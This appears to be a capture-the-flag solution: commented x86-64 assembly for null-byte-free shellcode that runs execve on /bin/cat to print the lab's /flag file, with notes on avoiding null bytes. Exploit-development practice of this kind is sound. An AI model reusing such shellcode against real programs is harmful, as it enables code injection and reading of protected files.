# This is execve(/bin/cat), but without the null bytes. Here we go.
# This will segfault in the ELF, but that's only because Linux will enforce read-only .text
# Once you compile this down to shellcode, it no longer matters.

.intel_syntax noprefix
.global _start      # Start program at _start

.text      # Start text section

# Btw intentional design from the earlier shellcodes - this is above to force rip addressing to not lead with 0x0
cat_str:
    .ascii "/bin/cat "            # Declare a string /bin/cat. DO NOT NULL TERM THIS YET

flag_str:
    .ascii "/flag "               # Declare a string /path. DO NOT NULL TERM THIS YET

_start:

# Push ["/bin/cat", "/flag", NULL] onto the stack. Use $rsp to refer to this.
xor rcx, rcx
push rcx

# Push flag_str. But before we do that, we have to null term it
lea rdi, [rip + flag_str]
mov BYTE PTR [rdi + 5], cl                   # Add a \0 at the end of flag_str. Index hard coded but that doesn't change anything
push rdi

# Push cat_str. But null term it before we do that    
lea rdi, [rip + cat_str]            # Get the address of cat_str
mov BYTE PTR [rdi + 8], cl                   # Dynamically add the null term
push rdi

# execve("/bin/cat", ["/bin/cat", "/flag", NULL], NULL)
# https://blog..org/posts/Linux_System_Call_Table_for_x86_64/ - Syscall table
xor rax, rax
mov al, 59                      # al to limit lower bits
lea rdi, [rip + cat_str]
mov rsi, rsp
xor rdx, rdx

push rdi                        # Add this to prevent null bytes
syscall

